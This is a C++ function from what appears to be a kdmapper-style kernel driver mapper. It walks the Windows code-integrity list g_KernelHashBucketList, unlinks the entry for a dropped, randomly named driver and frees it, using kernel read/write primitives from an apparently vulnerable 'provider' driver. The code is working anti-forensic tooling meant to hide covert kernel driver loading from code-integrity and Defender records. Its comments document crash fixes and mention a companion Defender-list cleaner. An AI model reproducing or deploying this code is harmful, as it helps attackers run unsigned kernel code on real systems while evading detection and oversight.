	//A wrong offset cannot produce a UNICODE_STRING whose buffer holds our random
	//driver name, so a match is its own proof and the offset is never trusted on
	//its own.
	//
	//There used to be a length gate in front of that read, on the theory that the
	//stored path is the dropped path minus the two characters of "\??". It is
	//four characters, the arithmetic was fitted to one observed layout, and it was
	//the only thing standing between the match and the end of the list: a build
	//where the arithmetic did not hold skipped every entry, reported nothing
	//found, and failed the run. The gate is gone and the match is made on
	//content, which is what it always had to be.

	uint32_t walked = 0;
	while (entry) {
		if (++walked > kMaxHashBucketEntries) {
			Log(L"[-] g_KernelHashBucketList walk exceeded " << Val(kMaxHashBucketEntries)
				<< L" entries; the list is circular or corrupt" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		/*
		 * `entry` is a pointer read out of the previous entry's first field. It
		 * has been no more than validated as non-null, and the range of the kernel
		 * half of the address space is overwhelmingly unmapped - so this is read
		 * at an address the provider will fault on rather than refuse. Probed
		 * before it is dereferenced, like every other pointer in this file that
		 * was not resolved from a symbol.
		 */
		if (!IsKernelAddress((uint64_t)entry) ||
			!ProbeKernelRangeMapped((uint64_t)entry, sizeof(Nt::HashBucketEntry))) {
			Log(L"[-] g_KernelHashBucketList entry " << Val(reinterpret_cast<void*>(entry))
				<< L" is not a mapped kernel address, aborting" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName, &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		{
			/*
			 * DriverName is a UNICODE_STRING at entry+0x8, so its Buffer is
			 * sizeof(UNICODE_STRING) - sizeof(PVOID) bytes past the Length -
			 * NOT sizeof(USHORT). Reading at Length+sizeof(USHORT) landed on
			 * MaximumLength and the padding before Buffer, so the "pointer"
			 * read back was MaximumLength in the low bytes and a couple of
			 * Buffer's own bytes in the high ones. The provider then
			 * dereferenced that garbage: the address it faulted on,
			 * 0x28680043005C0070, is exactly MaximumLength(0x70) |
			 * <padding> | Buffer&0xFFFF, which is the 0x3B that took a
			 * session. Use offsetof(UNICODE_STRING, Buffer) so the layout
			 * cannot drift out of sync with the type again.
			 */
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory((uintptr_t)entry + g_offsets.HashBucketEntry_DriverName + offsetof(UNICODE_STRING, Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			//A name buffer is kernel memory. Anything else means the entry
			//layout does not match this build; abort rather than hand the
			//provider a bad address to fault on.
			//Probed as well as range checked, for the same reason as the entry
			//itself: the buffer pointer comes out of the entry, so a wrong
			//DriverName offset produces a plausible-looking pointer into
			//unmapped kernel memory rather than an obviously wrong one.
			if (!IsKernelAddress((uint64_t)wsNamePtr) ||
				wsNameLen > 2048 || (wsNameLen % sizeof(wchar_t)) != 0 ||
				!ProbeKernelRangeMapped((uint64_t)wsNamePtr, wsNameLen)) {
				Log(L"[-] g_KernelHashBucketList entry text ptr " << Val(reinterpret_cast<void*>(wsNamePtr))
					<< L" is not a mapped kernel address, refusing to read it" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				/*
				 * Match by content, exactly as the public reference does (kdmapper,
				 * credited to @KDIo3 and @Swiftik): the substring match on the name
				 * read from the verified offset is the layout check. The stored
				 * DriverName is the full path the kernel hashed, so it is matched
				 * by substring - not by equality.
				 *
				 * An earlier version added a second, exact-match verification here
				 * that compared the field to the short driver name. That equality
				 * never held against a full path, and the miss branch did
				 * `prev = entry; continue;` WITHOUT advancing the walk, so it spun
				 * forever holding g_HashCacheLock - an auto-boosted ERESOURCE. The
				 * thread kept AutoBoostActive set and bugchecked 0x13C
				 * INVALID_IO_BOOST_STATE when it was torn down.
				 */
				LogBlank();
				Log(L"[+] FoundInKernelHashBucketList = " << Val(std::wstring(&wsName[find_result])) << std::endl);
				Nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(PVOID))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(PVOID))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool((uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList = Cleaned" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					return false;
				}
				Log(L"[+] g_HashCacheLock = Released" << std::endl);
				return true;
			}
		}
		prev = entry;
		//read next
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(PVOID))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	/*
	 * The whole list was walked and none of its entries was ours.
	 *
	 * True, not false. ci.dll records an entry when the kernel hashes a driver
	 * image, and how and when it does that varies: an image the kernel never
	 * hashed produces no entry at all, which is "nothing to clean" rather than a
	 * failure. Returning false here made Driver::Load abort a run that had nothing
	 * wrong with it, with a message naming a kernel structure it had in fact
	 * cleaned correctly. ClearWdFilterDriverList draws the same line and says so
	 * explicitly; this now does too.
	 *
	 * false is reserved for the failures above, where the walk itself did not
	 * complete and the state of the list is unknown.
	 */
	if (!ExReleaseResourceLite(g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		return false;
	}
	Log(L"[INFO] Provider not found in g_KernelHashBucketList, nothing to clean" << std::endl);
	return true;
}
